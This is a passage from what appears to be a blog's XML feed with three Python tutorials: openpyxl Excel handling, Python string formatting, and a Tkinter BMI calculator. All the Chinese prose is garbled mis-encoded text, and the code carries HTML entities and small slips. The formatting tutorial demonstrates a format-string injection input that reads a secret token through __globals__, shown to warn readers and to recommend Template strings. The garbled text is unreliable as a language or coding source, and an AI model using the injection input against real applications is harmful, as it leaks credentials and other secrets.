ç’°å¢ƒè¨­å®šåœ¨é–‹å§‹æ’°å¯«ç¨‹å¼ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆæº–å‚™å¥½é–‹ç™¼ç’°å¢ƒï¼ˆæ ¹æ“šä½ çš„ä½œæ¥­ç³»çµ±å®‰è£ Anaconda Python3ã€virtualenv æ¨¡çµ„ã€openyxl æ¨¡çµ„ï¼‰ã€‚

é€™é‚Šæˆ‘å€‘ä½¿ç”¨ MacOS ç’°å¢ƒæ­é… jupyter notebook åšç¯„ä¾‹æ•™å­¸ï¼š
# å‰µå»ºä¸¦ç§»å‹•åˆ°è³‡æ–™å¤¾$ mkdir pyexcel-example$ cd pyexcel-example$ jupyter notebook

é–‹å•Ÿ jupyter notebook å¾Œæ–°å¢ä¸€å€‹ Python3 Notebook

é¦–å…ˆå…ˆå®‰è£ openyxl å¥—ä»¶ï¼ˆåœ¨ jupyter ä½¿ç”¨ $ !pip install &lt;your-package&gt; å®‰è£å¥—ä»¶ï¼‰ï¼š
ä½¿ç”¨ shift + enter å¯ä»¥åŸ·è¡ŒæŒ‡ä»¤
!pip install openpyxl

è¨˜å¾—è¦å…ˆå®‰è£ openpyxl æ¨¡çµ„ï¼Œè‹¥æ˜¯æ²’å®‰è£æ¨¡çµ„å‰‡æœƒå‡ºç¾ ModuleNotFoundError: No module named &#39;openpyxl&#39; éŒ¯èª¤è¨Šæ¯ã€‚

è®€å– Excel æª”æ¡ˆ
ä½¿ç”¨ Openpyxl é–‹å•Ÿ Excel æª”æ¡ˆï¼ˆå¯ä»¥å¾é€™é‚Šä¸‹è¼‰ç¯„ä¾‹ Excel è³‡æ–™æª”æ¡ˆï¼‰ï¼Œä¸‹è¼‰å¾Œæª”åæ”¹ç‚º sample.xlsxï¼Œä¸¦æ”¾åˆ°å’Œ jupyter Notebook åŒæ¨£ä½ç½®çš„è³‡æ–™å¤¾ä¸‹ï¼š
 from openpyxl import load_workbookwb = load_workbook(&#x27;sample.xlsx&#x27;)print(wb.sheetnames)

 åŸ·è¡Œå¾Œå¯ä»¥è®€å–æ´»é ç°¿ç‰©ä»¶ï¼ˆé¡ä¼¼è®€å–æª”æ¡ˆï¼‰ä¸¦å°å‡ºé€™å€‹ç¯„ä¾‹æª”æ¡ˆçš„å·¥ä½œè¡¨åç¨±ï¼š
 [&#x27;Sheet1&#x27;]

å¾å·¥ä½œè¡¨ä¸­å–å¾—å„²å­˜æ ¼ï¼ˆå–å¾— A1 å„²å­˜æ ¼è³‡æ–™ï¼‰
 ws[&#x27;A1&#x27;].value

å¾å·¥ä½œè¡¨ä¸­å–å¾—æ¬„å’Œåˆ—
 åˆ—å‡ºæ¯ä¸€æ¬„çš„å€¼
 for row in ws.rows:    for cell in row:        print(cell.value)

 åˆ—å‡ºæ¯ä¸€åˆ—çš„å€¼
 for column in ws.columns:    for cell in column:        print(cell.value)

å¯«å…¥ Excel æª”æ¡ˆ

å‰µå»ºä¸¦å„²å­˜ Excel æª”æ¡ˆ
 from openpyxl import Workbook# å‰µå»ºä¸€å€‹ç©ºç™½æ´»é ç°¿ç‰©ä»¶wb = Workbook()

å»ºç«‹å·¥ä½œè¡¨
 # é¸å–æ­£åœ¨å·¥ä½œä¸­çš„è¡¨å–®ws = wb.active

å°‡å€¼å¯«å…¥å„²å­˜æ ¼å…§
 # æŒ‡å®šå€¼çµ¦ A1 å„²å­˜æ ¼ws[&#x27;A1&#x27;] = &#x27;æˆ‘æ˜¯å„²å­˜æ ¼&#x27;# å‘ä¸‹æ–°å¢ä¸€åˆ—ä¸¦é€£çºŒæ’å…¥å€¼ws.append([1, 2, 3])ws.append([3, 2, 1])

å„²å­˜æª”æ¡ˆ
 # å„²å­˜æˆ create_sample.xlsx æª”æ¡ˆwb.save(&#x27;create_sample.xlsx&#x27;)


ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ Python ç¨‹å¼æ“ä½œ Excel è©¦ç®—è¡¨ï¼Œé€é Python å¯ä»¥è®€å–å’Œå¯«å…¥ Excel æª”æ¡ˆï¼Œç›¸ä¿¡åªè¦èƒ½æ´»ç”¨å°±èƒ½å¤ æ¸›å°‘ä¸€èˆ¬ä¾‹è¡Œæ€§çš„ç¹ç‘£å·¥ä½œã€‚è‹¥éœ€è¦æ›´å¤š openpyxl æ“ä½œæ–¹å¼å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶æ•™å­¸ï¼Œæˆ‘å€‘ä¸‹å›è¦‹å›‰ï¼
åƒè€ƒæ–‡ä»¶
openpyxl - A Python library to read&#x2F;write Excel 2010 xlsx&#x2F;xlsm files

ï¼ˆimage via matplotlib
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>excel</tag>
        <tag>è©¦ç®—è¡¨</tag>
        <tag>how-to</tag>
        <tag>spreadsheet</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python é€²è¡Œå­—ä¸²æ ¼å¼åŒ–</title>
    <url>/2019/05/03/how-to-use-python-string-format-method/</url>
    <content><![CDATA[
å‰è¨€åœ¨é–‹ç™¼æ‡‰ç”¨ç¨‹å¼æ™‚æˆ‘å€‘å¾€å¾€æœƒéœ€è¦æŠŠè®Šæ•¸é€²è¡Œå­—ä¸²æ ¼å¼åŒ–ï¼Œä¹Ÿå°±æ˜¯èªªæŠŠå­—ä¸²ä¸­çš„è®Šæ•¸æ›¿æ›æˆè®Šæ•¸å€¼ã€‚äº‹å¯¦ä¸Šï¼Œåœ¨ Python ä¸­æœ‰è¨±å¤šæ–¹å¼å¯ä»¥é€²è¡Œï¼Œå…¶ä¸­æœ€å¸¸è¦‹çš„æœ‰å››ç¨®æ–¹å¼ï¼ˆæ–¯æ–¯æœ‰ä¸‰ç¨®ï¼Œä½† Python å­—ä¸²æ ¼å¼åŒ–æ–¹å¼ç«Ÿç„¶æœ‰å››ç¨®ï¼ï¼‰ï¼š

èˆŠå¼å­—ä¸²æ ¼å¼åŒ–
æ–°å¼å­—ä¸²æ ¼å¼åŒ–
å­—ä¸²æ’å€¼
æ¨£æ¿å­—ä¸²

å­—ä¸²æ’å€¼æ˜¯åœ¨ Python 3.6 ä¹‹å¾Œæœ‰æ”¯æ´çš„æ–¹æ³•ï¼Œè‹¥æ˜¯ä½ çš„ç‰ˆæœ¬æ˜¯åœ¨ Python 3.6 ä¹‹å¾Œçš„è©±å»ºè­°å¯ä»¥ä½¿ç”¨ã€‚è‹¥æ˜¯éœ€è¦è®“ä½¿ç”¨è€…å¯ä»¥è¼¸å…¥è®Šæ•¸ä¾†è½‰æ›æˆå­—ä¸²æ ¼å¼åŒ–çš„è©±ï¼Œå»ºè­°å¯ä»¥ä½¿ç”¨æ¨£æ¿å­—ä¸²ä¾†é¿å…ä¸€äº›è³‡è¨Šå®‰å…¨ä¸Šçš„å•é¡Œã€‚
ä»¥ä¸‹å°±ä¸Šè¿°æåˆ°çš„å››ç¨®æ–¹æ³•ä¾†å„è‡ªèªªæ˜å…¶ç‰¹è‰²å’Œä½¿ç”¨æ–¹å¼ï¼š
èˆŠå¼å­—ä¸²æ ¼å¼åŒ–ï¼ˆ%ï¼‰ç›¸å°æ–¼ Python ç‰ˆæœ¬ä¹‹å¾Œæ¨è–¦ä½¿ç”¨çš„æ–°å¼å­—ä¸²æ ¼å¼åŒ–ï¼ŒèˆŠå¼ç‰ˆæœ¬ä½¿ç”¨ % é‹ç®—å­ä¾†é€²è¡Œå­—ä¸²æ ¼å¼åŒ–ï¼Œè‹¥æ˜¯æœ‰ C èªè¨€æ’°å¯«ç¶“é©—çš„è®€è€…æˆ–è¨±æœƒè¦ºå¾—çš„ä¼¼æ›¾ç›¸ä¼¼ï¼ˆæ˜¯ä¸æ˜¯æœ‰é»åƒ printfï¼Ÿï¼‰ã€‚ä½¿ç”¨ % æ ¼å¼æ˜¯å‘Šè¨´ Python ç›´è­¯å™¨è¦åœ¨é‚£é‚Šæ›¿æ›æ–‡å­— text ä¸¦ä½¿ç”¨å­—ä¸²å‘ˆç¾ã€‚é€™å°±æ˜¯æ‰€è¬‚çš„èˆŠå¼å­—ä¸²æ ¼å¼åŒ–ï¼ˆ%s æ˜¯ä»¥å­—ä¸²è¼¸å‡ºï¼Œ%f æ˜¯ä»¥æµ®é»æ•¸è¼¸å‡ºã€%d æ˜¯ä»¥åé€²ä½æ•´æ•¸è¼¸å‡ºï¼‰ï¼š
text = &#x27;world&#x27;print(&#x27;hello %s&#x27; % text)# hello world

è‹¥æ˜¯å¸Œæœ›æŠŠå…§å®¹è½‰æˆåå…­é€²ä½çš„è©±å¯ä»¥ä½¿ç”¨ï¼š
print(&#x27;%x&#x27; % 23)# 17

è‹¥æ˜¯æœ‰å¤šå€‹è®Šæ•¸è¦æ›¿æ›å‰‡ä½¿ç”¨ tuple å‚³ééœ€è¦æ›¿ä»£çš„å…§å®¹å€¼ï¼š
print(&#x27;hello %s %s&#x27; % (&#x27;world&#x27;, &#x27;go&#x27;))# hello world go

æ–°å¼å­—ä¸²æ ¼å¼åŒ–ï¼ˆformat()ï¼‰åœ¨ Python3 ä»¥å¾Œï¼Œé–‹å§‹å¼•é€²æ–°ä¸²æ ¼å¼åŒ–ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ format() å‡½å¼ä¾†è®“å­—ä¸²æ ¼å¼åŒ–ï¼Œå…¶åŠŸèƒ½å’ŒèˆŠå¼æ ¼å¼åŒ–ç›¸å·®ç„¡å¹¾ï¼Œä½†ä¸»è¦æ˜¯æ¨å» % è®“å­—ä¸²æ ¼å¼åŒ–ä½¿ç”¨ä¸Šå¯ä»¥æ›´åŠ æ­£å¸¸ã€è¦å¾‹ï¼Œå¯è®€æ€§ä¹Ÿç›¸å°æå‡ã€‚
ä¸€èˆ¬åŸºæœ¬ç”¨æ³•ï¼š
text = &#x27;world&#x27;print(&#x27;hello &#123;&#125;&#x27;.format(text))# hello world

ä¹Ÿå¯ä»¥ä½¿ç”¨åç¨±ä¾†æŒ‡å®šè®Šæ•¸è®Šæ›é †åºï¼š
name = &#x27;Jack&#x27;text = &#x27;world&#x27;print(&#x27;hello &#123;name&#125;, hello &#123;text&#125;&#x27;.format(name=name, text=text))# hello Jack, hello world

è‹¥æ˜¯å¸Œæœ›æŠŠå…§å®¹è½‰æˆåå…­é€²ä½çš„è©±å¯ä»¥ä½¿ç”¨ format spec åœ¨ &#123;&#125; æ–°å¢ :xï¼š
print(&#x27;&#123;:x&#125;&#x27;.format(23))# 17

å­—ä¸²æ’å€¼ï¼ˆFormatted String Literalï¼‰é›–ç„¶å·²ç¶“æœ‰äº†æ–°å¼å­—ä¸²æ ¼å¼åŒ–ï¼Œç„¶è€Œåœ¨ Python 3.6 åˆæ–°å¢äº†æ ¼å¼å­—ä¸²å­—é¢å€¼ï¼ˆFormatted String Literalï¼‰æ­¤ä¸€ä½œæ³•å¯ä»¥æŠŠ Python é‹ç®—å¼åµŒå…¥åœ¨å­—ä¸²å¸¸æ•¸ä¸­ã€‚çœ¼å°–çš„è®€è€…å¯èƒ½æœƒç™¼ç¾ï¼Œå’¦ï¼Œæ€éº¼è·Ÿéš”å£æ£šçš„ JavaScript ES6 å­—ä¸²æ¨¡ç‰ˆæœ‰é»åƒå‘€ï¼Ÿ
ç¾åœ¨æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ä¸€èˆ¬çš„ä½¿ç”¨æ–¹å¼ï¼š
text = &#x27;world&#x27;print(f&#x27;Hello, &#123;text&#125;&#x27;)

æ–°çš„å­—ä¸²æ’å€¼èªæ³•ç›¸ç•¶å¼·å¤§çš„é»æ˜¯ï¼Œå¯ä»¥åœ¨è£¡é¢åµŒå…¥ä»»ä½• Python çš„é‹ç®—å¼ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘æƒ³è¦å‘ˆç¾æ•´æ•¸ç›¸åŠ ï¼š
x = 10y = 27print(f&#x27;x + y = &#123;x + y&#125;&#x27;)# 37

åŒæ¨£ï¼Œè‹¥æ˜¯å¸Œæœ›æŠŠå…§å®¹è½‰æˆåå…­é€²ä½çš„è©±å¯ä»¥ä½¿ç”¨ format spec åœ¨ &#123;&#125; æ–°å¢ :xï¼š
print(&#x27;&#123;:x&#125;&#x27;.format(23))# 17

è®€è€…å¯èƒ½æœƒè¦ºå¾—å¾ˆå­—ä¸²æ’å€¼ç¥å¥‡ï¼Œä½†äº‹å¯¦ä¸Šå…¶èƒŒå¾ŒåŸç†æ˜¯ç”± Python èªæ³•è§£æå™¨æŠŠ f-string å­—ä¸²æ’å€¼æ ¼å¼å­—ä¸²è½‰æˆä¸€é€£ä¸²çš„å­—ä¸²å¸¸æ•¸å’Œé‹ç®—å¼ï¼Œæœ€å¾Œçµåˆæˆæœ€çµ‚çš„å­—ä¸²ã€‚
def hello(text, name):    return f&#x27;hello &#123;text&#125;, hello &#123;name&#125;&#x27;# å¯¦éš›ä¸Š Python æœƒæŠŠå®ƒè®Šæˆå­—ä¸²å¸¸æ•¸å’Œè®Šæ•¸ï¼ˆéç¨‹ä¸­æœ‰å„ªåŒ–ï¼‰def hello(text, name):    return &#x27;hello &#x27; + text + &#x27;, hello&#x27; + name

æ¨£æ¿å­—ä¸²ï¼ˆTemplate Stringï¼‰æ¨£æ¿å­—ä¸²ï¼ˆTemplate Stringï¼‰æ©Ÿåˆ¶ç›¸å°ç°¡å–®ï¼Œä¹Ÿæ¯”è¼ƒå®‰å…¨ã€‚
ä»¥ä¸‹æ˜¯ä¸€èˆ¬çš„ä½¿ç”¨æƒ…å¢ƒï¼Œéœ€è¦å¾ Python å…§å»ºæ¨¡çµ„ string å¼•å…¥ï¼š
from string import Templatetext = &#x27;world&#x27;t = Template(&#x27;hello, $text&#x27;)t.substitute(text=text)# hello, world

ç„¶è€Œè‹¥æ˜¯å¸Œæœ›æŠŠå…§å®¹è½‰æˆåå…­é€²ä½çš„è©±éœ€è¦è‡ªå·±ä½¿ç”¨ hex å‡½å¼è‡ªå·±è½‰æ›ï¼š
from string import Templatenumber = 23t = Template(&#x27;hello, $number&#x27;)t.substitute(number=hex(number))# hello, 0x17

ç”±æ–¼å…¶ä»–çš„å­—ä¸²æ ¼å¼åŒ–åŠŸèƒ½è¼ƒç‚ºå¼·å¤§ï¼Œæ‰€ä»¥åè€Œæœƒé€ æˆæƒ¡æ„ä½¿ç”¨è€…è¼¸å…¥è®Šæ•¸æ›¿æ›æˆå­—ä¸²æ™‚é€ æˆä¸å¯é æœŸçš„éŒ¯èª¤ï¼ˆä¸€èˆ¬ä¾†èªªä½¿ç”¨è€…çš„è¼¸å…¥éƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼Œè¦é€²è¡Œéæ¿¾ï¼‰ã€‚
èˆ‰ä¾‹ä¾†èªªæƒ¡æ„ä½¿ç”¨è€…å¯èƒ½å¯ä»¥é€éå­—ä¸²æ ¼å¼çš„æƒ¡æ„è¼¸å…¥ä¾†ç²å–æ•æ„Ÿè³‡è¨Šï¼ˆä¾‹å¦‚ï¼šå¯†ç¢¼ã€tokenã€é‡‘é‘°ç­‰ï¼‰ï¼›
SECRET_TOKEN = &#x27;my-secret-token&#x27;# Error funcclass Error:    def __init__(self):        passerr = Error()malicious_input = &#x27;&#123;error.__init__.__globals__[SECRET_TOKEN]&#125;&#x27;malicious_input.format(error=err)# my-secret-token

æ²’æƒ³åˆ°ï¼Œé€éå­—ä¸²æ ¼å¼çš„æ–¹å¼ç«Ÿç„¶å¯ä»¥é€é __globals__ å­—å…¸å–å‡ºæˆ‘å€‘çš„ SECRET_TOKENï¼Œè‹¥æ˜¯ä¸€ä¸ç•™ç¥ï¼Œå¾ˆå¯èƒ½æ©Ÿå¯†è³‡æ–™å°±æ´©æ¼å‡ºå»ã€‚æ­¤æ™‚è‹¥æ˜¯ä½¿ç”¨ Template String å‰‡æœƒç™¼ç”ŸéŒ¯èª¤ï¼Œæ˜¯æ¯”è¼ƒå®‰å…¨çš„é¸é …ï¼š
from string import TemplateSECRET_TOKEN = &#x27;my-secret-token&#x27;# Error funcclass Error:    def __init__(self):        passerr = Error()malicious_input = &#x27;$&#123;error.__init__.__globals__[SECRET_TOKEN]&#125;&#x27;t = Template(malicious_input)t.substitute(error=err)# ValueError: Invalid placeholder in string: line 1, col 1

ç¸½çµé›–ç„¶ Python çš„ä¿¡ä»°æ˜¯èƒ½ç”¨ç°¡å–®å”¯ä¸€çš„æ–¹å¼ä¾†å®Œæˆä»»å‹™ï¼Œç„¶è€Œå­—ä¸²æ ¼å¼åŒ–å»æœ‰å¤šç¨®æ–¹å¼ï¼Œä¹Ÿå„æœ‰å…¶å„ªç¼ºé»ï¼Œå…¶ä¸»è¦åŸå› æˆ–è¨±åœ¨æ–¼ç‰ˆæœ¬ä¸åŒè®Šé·æ‰€è‡´ã€‚æ‰€ä»¥ä½ æœ‰å¯èƒ½åœ¨å…¬å¸å…§éƒ¨å°ˆæ¡ˆä¸åŒå°ˆæ¡ˆçœ‹åˆ°ä½¿ç”¨ä¸åŒçš„å­—ä¸²æ ¼å¼åŒ–æ–¹å¼ï¼Œè‹¥æ˜¯çœ‹åˆ°åŒä¸€å€‹å°ˆæ¡ˆä½¿ç”¨ä¸åŒå­—ä¸²æ ¼å¼åŒ–æ–¹å¼ä¹Ÿä¸è¦é©šè¨ã€‚
ä¸€èˆ¬æƒ…æ³æˆ‘å€‘æœƒæ ¹æ“šä¸åŒ Python ç‰ˆæœ¬å’Œä½¿ç”¨æƒ…å¢ƒå»ä½¿ç”¨ä¸åŒå­—ä¸²æ ¼å¼åŒ–æ–¹å¼ï¼Œä¾‹å¦‚ï¼šè‹¥æ˜¯ä½¿ç”¨ Python 3.6 ä¹‹å¾Œçš„è©±å»ºè­°å¯ä»¥ä½¿ç”¨å­—ä¸²æ’å€¼ï¼Œè‹¥ç‰ˆæœ¬æ¯” 3.6 èˆŠï¼Œå‰‡ä½¿ç”¨æ–°å¼å­—ä¸²æ ¼å¼åŒ–ï¼ˆformat()ï¼‰ã€‚è‹¥æ˜¯éœ€è¦è®“ä½¿ç”¨è€…å¯ä»¥è¼¸å…¥è®Šæ•¸ä¾†è½‰æ›æˆå­—ä¸²æ ¼å¼åŒ–çš„è©±ï¼Œå»ºè­°å¯ä»¥ä½¿ç”¨æ¨£æ¿å­—ä¸²ä¾†é¿å…ä¸€äº›è³‡è¨Šå®‰å…¨ä¸Šçš„å•é¡Œã€‚
åƒè€ƒæ–‡ä»¶
python string â€” Common string operations
(é‚£äº›éæ™‚çš„) Python å­—ä¸²æ ¼å¼åŒ–ä»¥åŠ f-string å­—ä¸²æ ¼å¼åŒ–
å­—ä¸²æ ¼å¼åŒ–
Python String Formatting Best Practices
Python å­—ä¸²æ ¼å¼åŒ–æ•™å­¸èˆ‡ç¯„ä¾‹
A Quick Guide to Format String in Python

ï¼ˆimage via unsplash
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>how-to</tag>
        <tag>string format</tag>
        <tag>Formatted String Literal</tag>
        <tag>string</tag>
        <tag>Template String</tag>
        <tag>å­—ä¸²æ ¼å¼åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python Tkinter è£½ä½œ GUI æ‡‰ç”¨ç¨‹å¼å…¥é–€æ•™å­¸</title>
    <url>/2019/09/21/how-to-use-python-tkinter-to-make-gui-app-tutorial/</url>
    <content><![CDATA[
å‰è¨€é™¤äº† Web å’Œ Mobile App ä¹‹å¤–ï¼Œæ¡Œé¢æ‡‰ç”¨ç¨‹å¼ï¼ˆDesktop Applicationï¼‰ä¹Ÿæ˜¯ä½¿ç”¨è€…å¸¸ä½¿ç”¨çš„æ‡‰ç”¨ç¨‹å¼åœ–å½¢åŒ–ä½¿ç”¨è€…ä»‹é¢ï¼ˆGUIï¼‰ã€‚é€é GUI å¯ä»¥è®“ä¸€èˆ¬ä½¿ç”¨è€…é€éæ¯”è¼ƒç›´è¦ºçš„æ–¹å¼ä¾†å’Œç¨‹å¼äº’å‹•ï¼ˆç•¢ç«Ÿè¦è®“ä¸€èˆ¬çš„ä½¿ç”¨è€…ä½¿ç”¨ Command Line ä¾†æ“ä½œç¨‹å¼æ˜¯æŒºé›£çš„ï¼‰ï¼Œä¹Ÿå¯ä»¥è®“æ•´å€‹ä½¿ç”¨è€…è¡Œç‚ºæ›´ç‚ºç°¡ä¾¿ã€‚è¨±å¤šç¨‹å¼èªè¨€éƒ½æœ‰æä¾› GUI çš„å‡½å¼åº«ï¼Œè®“é–‹ç™¼è€…å¯ä»¥é€éå¸¸è¦‹çš„å…ƒä»¶ï¼Œä¾‹å¦‚ï¼šæŒ‰éˆ•ã€æ–‡å­—æ–¹å¡Šã€ä¸‹æ‹‰å¼é¸å–®ç­‰æ–¹å¼ä¾†è¨­è¨ˆæ•´å€‹æ‡‰ç”¨ç¨‹å¼ã€‚åœ¨é€™è£¡ï¼Œæˆ‘å€‘å°‡ä½¿ç”¨ Python å…§å»ºçš„ Tkinter å‡½å¼åº«ä¾†å»ºç«‹ä¸€å€‹ç°¡å–®çš„ BMI è¨ˆç®—æ‡‰ç”¨ç¨‹å¼ï¼Œè®“è®€è€…æ„Ÿå—ä¸€ä¸‹ Python Tkinter è¨­è¨ˆæ¡Œé¢æ‡‰ç”¨ç¨‹å¼çš„æµç¨‹ã€‚
Tkinter å‡½å¼åº«ç°¡ä»‹åŸºæœ¬è¨­è¨ˆæµç¨‹æ’°å¯« Tkinter GUI ç¨‹å¼ä¸»è¦æœƒæœ‰ä»¥ä¸‹ä¸‰å€‹æ­¥é©Ÿï¼š

å»ºç«‹ä¸»è¦–çª—ï¼ˆè¨­å®šè¦–çª—å¤§å°ã€ä½ç½®å’Œè¦–çª—åç¨±ï¼‰
å°‡å…ƒä»¶ï¼ˆå¦‚ï¼šæŒ‰éˆ•ã€æ–‡å­—æ–¹å¡Šã€é¸å–®ç­‰ï¼‰æ”¾å…¥è¦–çª—ä¸­
å¯¦ä½œäº‹ä»¶è™•ç†å‡½å¼ï¼Œç•¶ä½œä½¿ç”¨è€…äº’å‹•æ™‚çš„äº‹ä»¶è™•ç†å™¨ï¼ˆevent handlerï¼‰ã€‚ä¾‹å¦‚ï¼šç•¶ä½¿ç”¨è€…é»æ“ŠæŸå€‹æŒ‰éˆ•æ™‚è¦è§¸ç™¼ä»€éº¼è¡Œç‚ºã€‚

ä»¥ä¸‹æ˜¯ç°¡å–®çš„ç¯„ä¾‹ç¨‹å¼ï¼Œå»ºç«‹ä¸»è¦–çª—å¾ŒåŠ å…¥ 3+1 å€‹æŒ‰éˆ•å…ƒä»¶ï¼Œç•¶é»æ“Šä¸‹æ–¹æŒ‰éˆ•å…ƒä»¶æ™‚ï¼Œäº‹ä»¶è™•ç†å™¨æœƒå°å‡º hello world :)
# å¼•å…¥å¥—ä»¶import tkinter as tk# å»ºç«‹ä¸»è¦–çª—å’Œ Frameï¼ˆæŠŠå…ƒä»¶è®Šæˆç¾¤çµ„çš„å®¹å™¨ï¼‰window = tk.Tk()top_frame = tk.Frame(window)# å°‡å…ƒä»¶åˆ†ç‚º top/bottom å…©ç¾¤ä¸¦åŠ å…¥ä¸»è¦–çª—top_frame.pack()bottom_frame = tk.Frame(window)bottom_frame.pack(side=tk.BOTTOM)# å»ºç«‹äº‹ä»¶è™•ç†å‡½å¼ï¼ˆevent handlerï¼‰ï¼Œé€éå…ƒä»¶ command åƒæ•¸å­˜å–def echo_hello():    print(&#x27;hello world :)&#x27;)# ä»¥ä¸‹ç‚º top ç¾¤çµ„left_button = tk.Button(top_frame, text=&#x27;Red&#x27;, fg=&#x27;red&#x27;)# è®“ç³»çµ±è‡ªå‹•æ“ºæ”¾å…ƒä»¶ï¼Œé è¨­ç‚ºç”±ä¸Šè€Œä¸‹ï¼ˆé å·¦ï¼‰left_button.pack(side=tk.LEFT)middle_button = tk.Button(top_frame, text=&#x27;Green&#x27;, fg=&#x27;green&#x27;)middle_button.pack(side=tk.LEFT)right_button = tk.Button(top_frame, text=&#x27;Blue&#x27;, fg=&#x27;blue&#x27;)right_button.pack(side=tk.LEFT)# ä»¥ä¸‹ç‚º bottom ç¾¤çµ„# bottom_button ç¶å®š echo_hello äº‹ä»¶è™•ç†ï¼Œé»æ“Šè©²æŒ‰éˆ•æœƒå°å‡º hello world :)bottom_button = tk.Button(bottom_frame, text=&#x27;Black&#x27;, fg=&#x27;black&#x27;, command=echo_hello)# è®“ç³»çµ±è‡ªå‹•æ“ºæ”¾å…ƒä»¶ï¼ˆé ä¸‹æ–¹ï¼‰bottom_button.pack(side=tk.BOTTOM)# é‹è¡Œä¸»ç¨‹å¼window.mainloop()

è§€çœ‹æˆæœï¼š
å»ºç«‹ BMI App ä¸»è¦–çª—åœ¨å»ºç«‹æˆ‘å€‘çš„æ‡‰ç”¨ç¨‹å¼å‰ï¼Œæˆ‘å€‘å…ˆç°¡å–®ä½¿ç”¨ç¹ªè£½æˆ‘å€‘ä»‹é¢çš„ mockup åœ–ï¼š
æ•´å€‹æ‡‰ç”¨ç¨‹å¼æµç¨‹å¦‚ä¸‹ï¼š

æä¾›è¼¸å…¥æ¡†è®“ä½¿ç”¨è€…å¯ä»¥è¼¸å…¥å…¶èº«é«˜ï¼ˆmï¼‰ã€é«”é‡ï¼ˆkgï¼‰
é»æ“Šé¦¬ä¸Šè¨ˆç®—æŒ‰éˆ•å¾Œè¨ˆç®— BMI æŒ‡æ•¸
é¡¯ç¤ºçµæœæ–¼ç•«é¢ä¸Š

import tkinter as tkwindow = tk.Tk()# è¨­å®šè¦–çª—æ¨™é¡Œã€å¤§å°å’ŒèƒŒæ™¯é¡è‰²window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)# é‹è¡Œä¸»ç¨‹å¼window.mainloop()

æˆæœå¦‚ä¸‹ï¼š

å»ºç«‹ BMI App å…ƒä»¶å»ºç«‹å®Œä¸»è¦–çª—å¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘ä¾†æŠŠå…ƒä»¶ä¸€ä¸€åŠ å…¥åˆ°ä¸»è¦–çª—ï¼Œæˆ‘å€‘å…ƒä»¶ä¸»è¦åˆ†æˆä¸‰å¤§éƒ¨åˆ†ï¼š

æ¨™é¡Œé¡¯ç¤º BMI è¨ˆç®—å™¨ æ–‡å­—å€å¡Š
èº«é«˜é«”é‡è¼¸å…¥å€å¡Š
é¡¯ç¤ºçµæœå’Œé»æ“ŠæŒ‰éˆ•

import tkinter as tkwindow = tk.Tk()window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)header_label = tk.Label(window, text=&#x27;BMI è¨ˆç®—å™¨&#x27;)header_label.pack()# ä»¥ä¸‹ç‚º height_frame ç¾¤çµ„height_frame = tk.Frame(window)# å‘ä¸Šå°é½Šçˆ¶å…ƒä»¶height_frame.pack(side=tk.TOP)height_label = tk.Label(height_frame, text=&#x27;èº«é«˜ï¼ˆmï¼‰&#x27;)height_label.pack(side=tk.LEFT)height_entry = tk.Entry(height_frame)height_entry.pack(side=tk.LEFT)# ä»¥ä¸‹ç‚º weight_frame ç¾¤çµ„weight_frame = tk.Frame(window)weight_frame.pack(side=tk.TOP)weight_label = tk.Label(weight_frame, text=&#x27;é«”é‡ï¼ˆkgï¼‰&#x27;)weight_label.pack(side=tk.LEFT)weight_entry = tk.Entry(weight_frame)weight_entry.pack(side=tk.LEFT)result_label = tk.Label(window)result_label.pack()calculate_btn = tk.Button(window, text=&#x27;é¦¬ä¸Šè¨ˆç®—&#x27;)calculate_btn.pack()window.mainloop()

æˆæœï¼š
å»ºç«‹ BMI App äº‹ä»¶è™•ç†åŠ å…¥å…ƒä»¶å¾Œæˆ‘å€‘å¯ä»¥å»ºç«‹
def calculate_bmi_number():    height = float(height_entry.get())    weight = float(weight_entry.get())    bmi_value = round(weight / math.pow(height, 2), 2)    result = &#x27;ä½ çš„ BMI æŒ‡æ•¸ç‚ºï¼š&#123;&#125; &#123;&#125;&#x27;.format(bmi_value, get_bmi_status_description(bmi_value))    # å°‡è¨ˆç®—çµæœæ›´æ–°åˆ° result_label æ–‡å­—å…§å®¹    result_label.configure(text=result)def get_bmi_status_description(bmi_value):    if bmi_value &lt; 18.5:        return &#x27;é«”é‡éè¼•å›‰ï¼Œå¤šåƒé»ï¼&#x27;    elif bmi_value &gt;= 18.5 and bmi_value &lt; 24:        return &#x27;é«”é‡å‰›å‰›å¥½ï¼Œç¹¼çºŒä¿æŒï¼&#x27;    elif bmi_value &gt;= 24 :        return &#x27;é«”é‡æœ‰é»éé‡å›‰ï¼Œå°‘åƒå¤šé‹å‹•ï¼&#x27;

